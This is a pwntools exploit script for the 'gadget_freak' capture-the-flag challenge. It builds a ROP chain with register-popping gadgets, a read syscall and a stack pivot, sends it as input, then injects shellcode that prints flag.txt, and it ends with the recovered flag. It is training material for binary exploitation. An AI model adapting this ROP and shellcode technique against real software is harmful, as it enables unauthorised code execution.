from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./gadget_freak', '''
    b *(main+1212)
    continue
''')

# p = remote('gadget-freak.harkonnen.b01lersc.tf', 8443, ssl=True)

# 0x330d60: pop rax; ret;
payload = p64(0x300000+0xc358*4)
payload += p64(0) # rax = 0
# 0x33097c: pop rdi; ret 0;
payload += p64(0x300000+0xc25f*4)
payload += p64(0) # rdi = 0
# 0x330d78: pop rsi; ret;
payload += p64(0x300000+0xc35e*4)
payload += p64(0x300000+0x50f*4+2) # rsi = 0x30143e, right after the syscall gadget, the cat flag.txt shellcode placed
# 0x330d68: pop rdx; ret;
payload += p64(0x300000+0xc35a*4)
payload += p64(0x100) # rdx = 0x100
# 0x30143c: syscall;
payload += p64(0x300000+0x50f*4) # syscall read
# padding
payload += b'A'*(0x80-len(payload))
# mmap prot
payload += p64(7)
# 0x330e50: xchg esp,eax; ret;
payload += p64(0x300000+0xc394*4) # stack pivot

p.sendlineafter(b'Enter your choice: \n', b'2')
p.sendlineafter(b'Enter seed (up to 128 characters): \n', payload)

p.sendlineafter(b'Enter your choice: \n', b'7')

p.send(asm(shellcraft.cat('flag.txt'), arch='amd64'))

p.interactive()

# 0x300000 is executable, but 0x200000 is not
# 0x200000 is in rax
# key is to write gadgets from 0x300000 area to 0x200000 area and perform stack pivot to 0x200000 area
# bctf{P3t3_g4t_cagHu7_4nYwAy}